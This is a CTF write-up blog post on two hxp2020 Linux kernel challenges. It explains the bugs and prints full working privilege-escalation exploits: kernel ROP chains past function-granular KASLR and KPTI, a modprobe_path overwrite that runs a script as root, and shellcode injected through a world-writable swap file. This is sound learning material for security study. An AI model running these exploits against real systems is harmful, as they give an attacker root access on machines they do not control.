# Hxp2020


Congratulations to Kaztebin, ranked 1 in DEFCON CTF29 again.

It reminds me of my first ctf competition with Katzebin: hxp2020 [1]. There are some excellent challenges in this game which I missed out at that time, including some linux kernel exploitations. Recently I started to learn kernel pwn, and I think it's time to solve these left challenges.

<!--more-->

## kernel-rop | 6 solved | 667 points

The kernel insmod a bugged module "hackme", which has open/read/write functions.

In read function, It reads from kernel stack starting from tmp (rbp - 0x20h) with a size no more than 0x1000, and copy to user. However tmp is just 0x20 bytes long, which can cause some memory leaking on kernel stack.

```c
ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
{
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rbx
  bool v6; // zf
  ssize_t result; // rax
  int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
  unsigned __int64 v9; // [rsp+80h] [rbp-20h]

  _fentry__(f, data, size, off);
  v5 = v4;
  v9 = __readgsqword(0x28u);
  _memcpy(hackme_buf, tmp);
  if ( v5 > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, v5);
    BUG();
  }
  _check_object_size(hackme_buf, v5, 1LL);
  v6 = copy_to_user(data, hackme_buf, v5) == 0;
  result = -14LL;
  if ( v6 )
    result = v5;
  return result;
}
```

Same in write function, we can copy really long buffer to the kernel stack, causing stack overflow in kernel space.

```c
ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
{
  unsigned __int64 v4; // rdx
  ssize_t v5; // rbx
  int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
  unsigned __int64 v8; // [rsp+80h] [rbp-20h]

  _fentry__(f, data, size, off);
  v5 = v4;
  v8 = __readgsqword(0x28u);
  if ( v4 > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 0x1000LL, v4);
    BUG();
  }
  _check_object_size(hackme_buf, v4, 0LL);
  if ( copy_from_user(hackme_buf, data, v5) )
    return -14LL;
  _memcpy(tmp, hackme_buf);
  return v5;
}
```

Sounds like quite easy and straightforward, we can leak address to get the kernel image base, compute commit_creds and prepare_kernel_cred function address and using ROP to get root, just like the challenge name "kernel ROP". Well, no.

If you consider this challenge as a normal KALSR and smep bypass, you will fail for sure.  

Firstly of course, we edit the init file to debug the kernel and print out address of commit_creds like below.

```bash
/ $ cat /proc/kallsyms | grep commit_creds
ffffffffb614d360 T commit_creds
ffffffffb6987d90 r __ksymtab_commit_creds
ffffffffb69a0972 r __kstrtab_commit_creds
ffffffffb69a4d42 r __kstrtabns_commit_creds
/ $ cat /proc/kallsyms | grep prepare_kernel_cred
ffffffffb6096750 T prepare_kernel_cred
ffffffffb698d4fc r __ksymtab_prepare_kernel_cred
ffffffffb69a09b2 r __kstrtab_prepare_kernel_cred
ffffffffb69a4d42 r __kstrtabns_prepare_kernel_cred
```

And when we exit and do this again, wierd thing happens.

```bash
/ $ cat /proc/kallsyms | grep commit_creds
ffffffff8ea7cc90 T commit_creds
ffffffff8f587d90 r __ksymtab_commit_creds
ffffffff8f5a0972 r __kstrtab_commit_creds
ffffffff8f5a4d42 r __kstrtabns_commit_creds
/ $ cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff8eb2b4a0 T prepare_kernel_cred
ffffffff8f58d4fc r __ksymtab_prepare_kernel_cred
ffffffff8f5a09b2 r __kstrtab_prepare_kernel_cred
ffffffff8f5a4d42 r __kstrtabns_prepare_kernel_cred
```

The addresses does change, but we know that KASLR adds a random offset aligning to page size which means at least low bits should not change. What's going on?

After several frustrating hours, I found the reason. In Jun 2020, the patch [2] added one of the most annoying mitigation against kernel exploits: Function Granular Kernel Address Space Layout Randomization (fgkaslr). It rearranges kernel code at load time on a per-function level granularity, which means every function address can be different when loaded.

Seems like this challenge is unexploitable. But suddenly, I found that not all the functions are rearranged, like __ksymtab_commit_creds just printed out above! So are there any relation between __ksymtab_commit_creds and commit_creds?

I found out that every kernel symbol has a structure below, in which value_offset actually stored offset between address of the symbol and specific function. So if we get value_offset of __ksymtab_commit_creds, we can add to it and get the real address of commit_creds!

```c
truct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
```

Now the first things is to find out exactly which functions are affected by fgkaslr. Redirecting the output into files, I stored all the address of kallsym twice and got two txts.

```bash
bash ./run.sh > ./kallsyms1.txt
cat /proc/kallsym

# second time
bash ./run.sh > ./kallsyms2.txt
cat /proc/kallsym 
```

Then I searched for kernel text base and wrote a simple script to list all the functions unaffected by fgkaslr

```python
f1 = open("kallsyms1.txt")
line = f1.readline()
dict1 = {}
kernel_base1=0xffffffff8ac00000 # first time
print("start read file kallsyms1\n")
while line :
    sp = line.strip().split(" ")
    if int(sp[0],16) >= kernel_base1:
        dict1[sp[2]]=int(sp[0],16)-kernel_base1
    line = f1.readline()
f1.close()

f2 = open("kallsyms2.txt")
line = f2.readline()
dict2 = {}
kernel_base2=0xffffffffb2c00000 # second time
print("start read file kallsyms2\n")
while line :
    sp = line.strip().split(" ")
    if int(sp[0],16) >= kernel_base2:
        dict2[sp[2]]=int(sp[0],16)-kernel_base2
    line = f2.readline()

f2.close()

dict3 = {}
for k in dict1:
    if dict1[k] == dict2[k]:
        dict3[k] = dict1[k]

print("store no fg_kaslr\n")
f3 = open("find_no_fgkaslr.txt",'w+')
for k in dict3:
    s = "%016x : %s\n"%(dict3[k],k)
    f3.write(s)
f3.close()
```

It turned out that lots of functions are not rearranged, at least all gadgets we need.

```c
gadget1 = base + 0x6370; //  pop rdi; ret;
gadget2 = base + 0x4d11; //  pop rax; ret;
gadget3 = base + 0x4aad; //  mov rax, qword ptr [rax + 0x10]; pop rbp; ret;
ksymtab_commit_creds = base + 0xf87d90;
kpti_gadget = base + 0x200f10 + 0x16; //  swapgs_restore_regs_and_return_to_usermode()
ksymtab_prepare_kernel_cred = base + 0xf8d4fc;
```

Allright, now we can do ROPs after leaking kernel image base address and canary!

For example, we use gadgets to move value_offset to rax in get_addr(). In leak1(), we get the content of rax and compute address of prepare_kernel_cred.

```c
void get_addr(){
    char buf[0x150];
    memset(buf, '\x00', 0x150);
    unsigned long long *ropchain = (long long unsigned *)buf;
    int i = 16;
    ropchain[i++] = canary;
    ropchain[i++] = 0;
    ropchain[i++] = 0;
    ropchain[i++] = 0;
    ropchain[i++] = gadget2;
    ropchain[i++] = ksymtab_prepare_kernel_cred - 0x10;
    ropchain[i++] = gadget3;
    ropchain[i++] = 0;
    ropchain[i++] = kpti_gadget;
    ropchain[i++] = 0;
    ropchain[i++] = 0;
    ropchain[i++] = leak1;
    ropchain[i++] = tf.cs;
    ropchain[i++] = tf.eflags;
    ropchain[i++] = tf.rsp;
    ropchain[i++] = tf.ss;
    printf("[*] Never reach! try to read from kernel, return %ld \n", write(fd, buf, 0x150));
}

void leak1(){
         __asm__(
                "mov tmp_store, rax;"
        );
        prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
        printf("[*] prepare_kernel_cred: %p\n", prepare_kernel_cred);
        get_addr2();
}
```

The rest is the same, here is the full exploits.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>

#define KERNCALL __attribute__((regparm(3)))

void* (*prepare_kernel_cred)(void*) KERNCALL;
void* (*commit_creds)(void*) KERNCALL;

struct trap_frame{
    void *rip;
    unsigned long long cs;
    unsigned long long eflags;
    void *rsp;
    unsigned long long ss;
}__attribute__((packed));
struct trap_frame tf;
unsigned long long tf_addr = &tf;

long long unsigned canary;
long long unsigned base;
long long unsigned gadget1;
long long unsigned gadget2;
long long unsigned gadget3;
long long unsigned ksymtab_commit_creds;
long long unsigned ksymtab_prepare_kernel_cred;
long long unsigned kpti_gadget;
long long unsigned tmp_store;
int fd;

void init_tf_work(void){
    __asm__ volatile(".intel_syntax noprefix;"
        "mov tf+8, cs;"    //set cs
        "pushf;pop tf+16;"       //set eflags
        "push rsp;pop tf+24;"
        "mov tf+32, ss;");
    tf.rip = 0x100000;
    tf.rsp -= 8;
    printf("[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx\n", tf.cs, tf.ss, tf.eflags, tf.rsp);
}

unsigned long long u64(char * s){
    unsigned long long result = 0;
    for (int i = 7 ; i >=0 ;i--){
        result = (result << 8) | (0x00000000000000ff & s[i]);
    }
    return result;
}

void get_shell2(){
        printf("[!!] your id is %d\n", getuid());
        system("/bin/sh");
}

void get_shell(){
        __asm__(
                "mov tmp_store, rax;"
               );
        char buf[0x150];
        memset(buf, '\x00', 0x150);
        unsigned long long *ropchain = (long long unsigned *)buf;
        int i = 16;
        ropchain[i++] = canary;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = gadget1;
        ropchain[i++] = tmp_store;
        ropchain[i++] = commit_creds;
        ropchain[i++] = kpti_gadget;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = get_shell2;
        ropchain[i++] = tf.cs;
        ropchain[i++] = tf.eflags;
        ropchain[i++] = tf.rsp;
        ropchain[i++] = tf.ss;
        printf("[*] Never reach! try to write to kernel, return %ld \n", write(fd, buf, 0x150));
}

void get_root(){
        char buf[0x150];
        memset(buf, '\x00', 0x150);
        unsigned long long *ropchain = (long long unsigned *)buf;
        int i = 16;
        ropchain[i++] = canary;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = gadget1;
        ropchain[i++] = 0;
        ropchain[i++] = prepare_kernel_cred;
        ropchain[i++] = kpti_gadget;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = get_shell;
        ropchain[i++] = tf.cs;
        ropchain[i++] = tf.eflags;
        ropchain[i++] = tf.rsp;
        ropchain[i++] = tf.ss;
        printf("[*] Never reach! try to write to kernel, return %ld \n", write(fd, buf, 0x150));
}

void leak2(){
        __asm__(
                "mov tmp_store, rax;"
        );
        commit_creds = ksymtab_commit_creds + (int)tmp_store;
        printf("[*] commit_creds: %p\n", commit_creds);
        get_root();
}

void get_addr2(){
        char buf[0x150];
        memset(buf, '\x00', 0x150);
        unsigned long long *ropchain = (long long unsigned *)buf;
        int i = 16;
        ropchain[i++] = canary;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = gadget2;
        ropchain[i++] = ksymtab_commit_creds - 0x10;
        ropchain[i++] = gadget3;
        ropchain[i++] = 0;
        ropchain[i++] = kpti_gadget;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = leak2;
        ropchain[i++] = tf.cs;
        ropchain[i++] = tf.eflags;
        ropchain[i++] = tf.rsp;
        ropchain[i++] = tf.ss;
        printf("[*] Never reach! try to read from kernel, return %ld \n", write(fd, buf, 0x150));
}

void leak1(){
         __asm__(
                "mov tmp_store, rax;"
        );
        prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
        printf("[*] prepare_kernel_cred: %p\n", prepare_kernel_cred);
        get_addr2();
}

void get_addr(){
        char buf[0x150];
        memset(buf, '\x00', 0x150);
        unsigned long long *ropchain = (long long unsigned *)buf;
        int i = 16;
        ropchain[i++] = canary;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = gadget2;
        ropchain[i++] = ksymtab_prepare_kernel_cred - 0x10;
        ropchain[i++] = gadget3;
        ropchain[i++] = 0;
        ropchain[i++] = kpti_gadget;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = leak1;
        ropchain[i++] = tf.cs;
        ropchain[i++] = tf.eflags;
        ropchain[i++] = tf.rsp;
        ropchain[i++] = tf.ss;
        printf("[*] Never reach! try to read from kernel, return %ld \n", write(fd, buf, 0x150));
}

int main()
{
        fd = open("/dev/hackme", O_RDWR);
        printf("[+] open ko, return %d \n", fd);
        char buf[0x140];
        printf("[*] try to read from kernel, return %ld \n", read(fd, buf, 0x140));
        // long long unsigned base = u64(buf + 0xd8) - 0x569977;
        for(int i=0; i<0x140; i+=8){
        //      printf("[0x%x] %llx \n", i, u64(buf + i));
        }
        canary = u64(buf + 0x10);
        base = u64(buf + 0x130) - 0xa157;
        gadget1 = base + 0x6370; //  pop rdi; ret;
        gadget2 = base + 0x4d11; //  pop rax; ret;
        gadget3 = base + 0x4aad; //  mov rax, qword ptr [rax + 0x10]; pop rbp; ret;
        ksymtab_commit_creds = base + 0xf87d90;
        kpti_gadget = base + 0x200f10 + 0x16;
        ksymtab_prepare_kernel_cred = base + 0xf8d4fc;
        printf("[*] kernel base is %llx\n", base);
        init_tf_work();
        get_addr();
        return 1;
}
```

But this does not end yet. When I was looking for sovles by other players, I found a really elegant method [3]. This technique is trigger call_modprobe() to execute the file which modprobe_path points to by trying to execve() an unrecognisable format file. And by overwriting modprobe_path which is also unaffected by fgkaslr, we can let our script be executed, which causes an arbitrary code execution with root privileges.

```c
static int call_modprobe(char *module_name, int wait)
{
    ...
  	argv[0] = modprobe_path;
  	argv[1] = "-q";
  	argv[2] = "--";
  	argv[3] = module_name;
  	argv[4] = NULL;

  	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
    ...
}
```

Here is the exploit which works for me.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>

unsigned long pop_rax_ret; // pop rax; ret;
unsigned long pop_rbx_r12_rbp_ret; // pop rbx ; pop r12 ; pop rbp ; ret;
unsigned long write_ptr_rbx_rax_pop2_ret; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
unsigned long kpti_gadget;
unsigned long modprobe_path;
unsigned long canary;
unsigned long base;
int global_fd;

struct trap_frame{
    void *rip;
    unsigned long long cs;
    unsigned long long eflags;
    void *rsp;
    unsigned long long ss;
}__attribute__((packed));
struct trap_frame tf;
unsigned long long tf_addr = &tf;

unsigned long long u64(char * s){
    unsigned long long result = 0;
    for (int i = 7 ; i >=0 ;i--){
        result = (result << 8) | (0x00000000000000ff & s[i]);
    }
    return result;
}

void init_tf_work(void){
    __asm__ volatile(".intel_syntax noprefix;"
        "mov tf+8, cs;"    //set cs
        "pushf;pop tf+16;"       //set eflags
        "push rsp;pop tf+24;"
        "mov tf+32, ss;");
    tf.rip = 0x100000;
    tf.rsp -= 8;
    printf("[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx\n", tf.cs, tf.ss, tf.eflags, tf.rsp);
}

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}


void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = canary;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = 0x782f706d742f; // rax <- "/tmp/x"
    payload[off++] = pop_rbx_r12_rbp_ret;
    payload[off++] = modprobe_path; // rbx <- modprobe_path
    payload[off++] = 0x0; // dummy r12
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = write_ptr_rbx_rax_pop2_ret; // modprobe_path <- "/tmp/x"
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_gadget; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_flag;
    payload[off++] = tf.cs;
    payload[off++] = tf.eflags;
    payload[off++] = tf.rsp;
    payload[off++] = tf.ss;

    puts("[*] Prepared payload to overwrite modprobe_path");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}


int main()
{
        global_fd = open("/dev/hackme", O_RDWR);
        printf("[+] open ko, return %d \n", global_fd);
        char buf[0x140];
        printf("[*] try to read from kernel, return %ld \n", read(global_fd, buf, 0x140));
        // long long unsigned base = u64(buf + 0xd8) - 0x569977;
        for(int i=0; i<0x140; i+=8){
        //      printf("[0x%x] %llx \n", i, u64(buf + i));
        }
        canary = u64(buf + 0x10);
        base = u64(buf + 0x130) - 0xa157;
        modprobe_path = base + 0x1061820;
        kpti_gadget = base + 0x200f10 + 0x16;
        pop_rax_ret = base + 0x4d11UL; // pop rax; ret;
        pop_rbx_r12_rbp_ret = base + 0x3190UL; // pop rbx ; pop r12 ; pop rbp ; ret;
        write_ptr_rbx_rax_pop2_ret = base + 0x306dUL; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
        printf("[*] kernel base is %llx\n", base);
        init_tf_work();
        overflow();
        return 1;
}
```

Awesome!

```
/ $ /exp
[+] open ko, return 3
[*] try to read from kernel, return 320
[*] kernel base is ffffffff95200000
[*] Reg saved cs = 33, ss = 2b, flags = 206, user_sp = 7ffce5505978
[*] Prepared payload to overwrite modprobe_path
[*] Returned to userland, setting up for fake modprobe
[*] Run unknown file
/tmp/dummy: line 1: ����: not found
[*] Hopefully flag is readable
flag{TEST}
```

## pfoten | 18 solves | 370 points

A challenge containing no bug module or driver.

> Note: 
>
> 
>
> The kernel is a standard Linux kernel, we didn’t add any vulnerabilities.

Sounds like problems can only be found in init file

```bash
x1do0@x1do0:~/kernel_learning/pfoten$ cat ./files/etc/init.d/rcS
#!/bin/sh

/bin/busybox --install -s

stty raw -echo

chown -R 0:0 /

mkdir -p /proc && mount -t proc none /proc
mkdir -p /dev  && mount -t devtmpfs devtmpfs /dev
mkdir -p /tmp  && mount -t tmpfs tmpfs /tmp

umask 111

dd if=/dev/zero bs=1M count=10 of=/swap status=none
losetup /dev/loop0 /swap
mkswap /dev/loop0 >/dev/null
swapon /dev/loop0 >/dev/null
```

I didn't quite familiar with linux bash grammar. After looking for some information, I finally found out what he did.

1. set mask of file mode creation[4] as 111, which means all users can open and read the following files created.

2. add a 10MB size file /swap, filled with zero

3. correlate /dev/loop0 with /swap using losetup[5]

4. construct a swap space in loop0 using kaswap[6] and enable by swapon

But to fully understand the meanings, we should go deep into linux swap files[7]. Shortly, swap files is a cache for physical RAM. When RAM memory is insufficient, kernel will copy some memory to swap files on the hard disk temporarily in order to leave more memory in RAM. 

So you might find the bugs here too. Swap files should never be directly writed by users because when the swap operation happens between RAM and swap files, deliberately constructed data writed in swap files will be directly copy to RAM memory! 

Let's see what will happen if we keep mmaping to occupy virtual memory.

```c
#include <stdio.h>
#include <memory.h>
#include <stdlib.h>
#include <sys/mman.h>


int main(int argc, char const *argv[])
{
        for (int i = 0; ; ++i)
        {
                char* buffer = mmap(NULL, 1024*1024, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
                memset(buffer, 'A', 1024*1024);
                printf("%d\n", i);
                system("strings /swap");
        }
        return 0;
}
```

```
/ $ /poc > /tmp/out
[   39.624986] Out of memory: Killed process 79 (poc) total-vm:45108kB, anon-rss:40kB, file-rss:4kB, shmem-rss:36004kB,0
Killed
/ $ vi /tmp/out
```

After a few iterations, swap file will be filled with other things, which is actually some infrequently used memory staff.

```
...
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
bq|H
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
stapsdt
libc
lll_lock_wait_private
8@%rdi
stapsdt
libc
memory_mallopt_arena_max
8@%rax 8@32+mp_(%rip)
stapsdt
libc
memory_mallopt_arena_test
8@%rax 8@24+mp_(%rip)
stapsdt
...
Aug 23 02:05:37
<30>Aug 23 02:05:37 nit: starting pid 78, tty '': '-setuidgid 1 sh'
starting pid 78, tty '': '-setuidgid 1 sh'
::sysinit:/etc/init.d/rcS
::once:-setuidgid 1 sh
#!/bin/sh
/bin/busybox --install -s
stty raw -echo
chown -R 0:0 /
mkdir -p /proc && mount -t proc none /proc
mkdir -p /dev  && mount -t devtmpfs devtmpfs /dev
mkdir -p /tmp  && mount -t tmpfs tmpfs /tmp
umask 111
dd if=/dev/zero bs=1M count=10 of=/swap status=none
losetup /dev/loop0 /swap
mkswap /dev/loop0 >/dev/null
swapon /dev/loop0 >/dev/null
D$(t
L$8H
[]A\A]A^
AWAVI
AUATI
[]A\A]A^A_
ATUI
[]A\
...
```

You can see that even the memory of this ELF executable file was dumped into /swap.

According to Mr.2019[8], we can garble the init or exit process of busybox to shellocode, cuz they are running on root privelege. After compiling busybox with symbols, we can find specific sequences which indicate where the functions are and whether the memory is swaped into /swap. 

I tried but it didn't work for me, finding the sequences is a probablistic incident (actually quite rare). And even when I found the sequences after tons of failure, shellcode I write was not triggered at all.

I discussed with my fellow teammate pu1p[9]. He found that edit `syscall` function can gain much higher probability to trigger shellcode we write. It turned out the same on my machine.

What's more, we use exit machine code as a needle to indicate where the exit is and whether it's swaped. 

```asm
   0:   48 63 ff                movsxd rdi, edi
   3:   b8 e7 00 00 00          mov    eax, 0xe7
   8:   0f 05                   syscall
   a:   ba 3c 00 00 00          mov    edx, 0x3c
   f:   48 89 d0                mov    rax, rdx
  12:   0f 05                   syscall
  14:   eb f9                   jmp    0xf
  16:   48 89 f8                mov    rax, rdi
  19:   48 89 f7                mov    rdi, rsi
  1c:   48 89 d6                mov    rsi, rdx
  1f:   48 89 ca                mov    rdx, rcx
  22:   4d 89 c2                mov    r10, r8
  25:   4d 89 c8                mov    r8, r9
  28:   4c 8b 4c 24 08          mov    r9, QWORD PTR [rsp+0x8]
  2d:   0f 05                   syscall
  2f:   c3                      ret
```

Real shellcode is to open `sda/fd0`, read and write 

```asm
   0:   6a 01                   push   0x1
   2:   fe 0c 24                dec    BYTE PTR [rsp]
   5:   48 b8 2f 64 65 76 2f    movabs rax, 0x3064662f7665642f
   c:   66 64 30
   f:   50                      push   rax
  10:   48 89 e7                mov    rdi, rsp
  13:   31 d2                   xor    edx, edx
  15:   31 f6                   xor    esi, esi
  17:   6a 02                   push   0x2
  19:   58                      pop    rax
  1a:   0f 05                   syscall
  1c:   48 89 c7                mov    rdi, rax
  1f:   31 c0                   xor    eax, eax
  21:   31 d2                   xor    edx, edx
  23:   b6 01                   mov    dh, 0x1
  25:   be 01 01 01 01          mov    esi, 0x1010101
  2a:   81 f6 01 46 71 01       xor    esi, 0x1714601
  30:   0f 05                   syscall
  32:   6a 01                   push   0x1
  34:   5f                      pop    rdi
  35:   31 d2                   xor    edx, edx
  37:   b6 01                   mov    dh, 0x1
  39:   be 01 01 01 01          mov    esi, 0x1010101
  3e:   81 f6 01 46 71 01       xor    esi, 0x1714601
  44:   6a 01                   push   0x1
  46:   58                      pop    rax
  47:   0f 05                   syscall
```

Final exploits 

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PAGE_SIZE 0x80000
#define swap_size 0xa00000

const unsigned char NEEDLE[] = {
    0x48, 0x63, 0xFF, 0xB8, 0xE7, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xBA, 0x3C, 0x00, 0x00, 0x00, 0x48, 
    0x89, 0xD0, 0x0F, 0x05, 0xEB, 0xF9, 0x48, 0x89, 0xF8, 0x48, 0x89, 0xF7, 0x48, 0x89, 0xD6, 0x48, 
    0x89, 0xCA, 0x4D, 0x89, 0xC2, 0x4D, 0x89, 0xC8, 0x4C, 0x8B, 0x4C, 0x24, 0x08, 0x0F, 0x05, 0xC3
};


unsigned char swap_buf[swap_size];

void die(char *msg){
    printf("[!] %s\n", msg);
    exit(-1);
}

int match(){
    FILE *fp = fopen("/swap", "r+");
    if (fp == NULL) die("open /swap failed");
    int read_cnt = 0;
    while (1){
        int res = fread(swap_buf, 1, swap_size-read_cnt, fp);
        read_cnt += res;
        if (res == 0) {
            if (read_cnt != swap_size) die("read failed");
            break;
        }
    }
    // search for needle 
    unsigned char* res = memmem(swap_buf, swap_size, NEEDLE, sizeof(NEEDLE));
    if (res != NULL){
        size_t offset = res - swap_buf;
        if (fseek(fp, offset, SEEK_SET) == -1) die("fseek failed");
        // 0xcc to debug 
        char sc_buf[0x100];
        memset(sc_buf, 0xcc, sizeof(sc_buf));
        
        unsigned char sc[] = { 
            // needle for padding
            0x48, 0x63, 0xFF, 0xB8, 0xE7, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xBA, 0x3C, 0x00, 0x00, 0x00, 0x48, 
            0x89, 0xD0, 0x0F, 0x05, 0xEB, 0xF9, 0x48, 0x89, 0xF8, 0x48, 0x89, 0xF7, 0x48, 0x89, 0xD6, 0x48, 
            0x89, 0xCA, 0x4D, 0x89, 0xC2, 0x4D, 0x89, 0xC8, 0x4C, 0x8B, 0x4C, 0x24, 0x08, 0x0F, 0x05, 0xC3,
            // real shellcode
            0x6a, 0x1, 0xfe, 0xc, 0x24, 0x48, 0xb8, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x66, 0x64, 0x30, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x2, 0x58, 0xf, 0x5, 0x48, 0x89, 0xc7, 0x31, 0xc0, 0x31, 0xd2, 0xb6, 0x1, 0xbe, 0x1, 0x1, 0x1, 0x1, 0x81, 0xf6, 0x1, 0x46, 0x71, 0x1, 0xf, 0x5, 0x6a, 0x1, 0x5f, 0x31, 0xd2, 0xb6, 0x1, 0xbe, 0x1, 0x1, 0x1, 0x1, 0x81, 0xf6, 0x1, 0x46, 0x71, 0x1, 0x6a, 0x1, 0x58, 0xf, 0x5
        };
        // empty needle using nop, slip backward to our real shellcode 
        memset(sc, 0x90, sizeof(NEEDLE));
        if (fwrite(sc, 1, sizeof(sc), fp) != sizeof(sc)) // write to swap file
            die("fwrite failed");
        fclose(fp); 
        sleep(1);
        printf("found needle at offset : %p\n", offset);
        return 1;
    }
    memset(swap_buf, 0, swap_size);
    fclose(fp);
    return 0;
}

int main(int argc, char *argv[]){
    // consume some ram first
    for(int i=0; i<10; i++){
        void *res = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (res == (void *) -1) die("mmap error");
        memset(res, 0xcc, PAGE_SIZE);
    }

    printf("swap_buf at %p\n", swap_buf);

    // keep mmaping, search for strings every iteration
    int i = 0;
    while(++i < (320*6)){
        void *res = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (res == (void *) -1) die("mmap error");
        memset(res, 0xcc, PAGE_SIZE);
        if (i%50 == 0) printf("%d\n", i);
        if (match()) break;
    }
    return 0;
}
```

Excellent! After only two attempts, we get flag!

```
/ $ /exp
swap_buf at 0x4c4300
50
[    6.048215] Out of memory: Killed process 82 (exp) total-vm:50740kB, anon-rss:10288kB, file-rss:4kB, shmem-rss:29584kB, UID:1 pgtables:136kB oom_score_adj:0
Killed
/ $ /exp
swap_buf at 0x4c4300
50
found needle at offset : 0x592277
@Gp@GpXGpXGp�Gp�Gp�Gp�Gp�Gp�Gp�Gp�Gp�Gpflag{TEST}
[   12.215551] init[1]: segfault at 100 ip 00000000004d12f2 sp 00007ffe3b5fe908 error 4 in busybox[400000+104000]
[   12.216620] Code: 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 0f 05 6a 01 5f 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 6a 01 58 0f 05 14 d6 <48> 8b 0a 48 85 c9 0f 84 8a 00 00 00 48a
[   12.217481] Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
[   12.217996] CPU: 0 PID: 1 Comm: init Not tainted 5.8.5 #1
[   12.218194] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   12.218543] Call Trace:
[   12.219598]  dump_stack+0x57/0x70
[   12.219771]  panic+0xf6/0x2b7
[   12.219870]  do_exit.cold+0xda/0xdb
[   12.219979]  do_group_exit+0x2e/0x90
[   12.220090]  get_signal+0x16a/0x840
[   12.220200]  do_signal+0x2b/0x6e0
[   12.220302]  ? force_sig_info_to_task+0xb9/0xf0
[   12.220457]  ? force_sig_fault+0x47/0x70
[   12.220578]  ? __bad_area_nosemaphore+0xf7/0x140
[   12.220717]  __prepare_exit_to_usermode+0xfa/0x160
[   12.220864]  ? asm_exc_page_fault+0x8/0x30
[   12.220987]  prepare_exit_to_usermode+0x5/0x20
[   12.221132]  asm_exc_page_fault+0x1e/0x30
[   12.221474] RIP: 0033:0x4d12f2
[   12.221603] Code: 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 0f 05 6a 01 5f 31 d2 b6 01 be 01 01 01 01 81 f6 01 46 71 01 6a 01 58 0f 05 14 d6 <48> 8b 0a 48 85 c9 0f 84 8a 00 00 00 48a
[   12.222163] RSP: 002b:00007ffe3b5fe908 EFLAGS: 00000282
[   12.222335] RAX: 00000000000001d6 RBX: 0000000000000000 RCX: 00000000004d12f0
[   12.222546] RDX: 0000000000000100 RSI: 0000000000704700 RDI: 0000000000000001
[   12.222757] RBP: 00000000ffffffff R08: 0000000000000000 R09: 0000000000000000
[   12.222968] R10: 0000000000000000 R11: 0000000000000206 R12: 0000000000000000
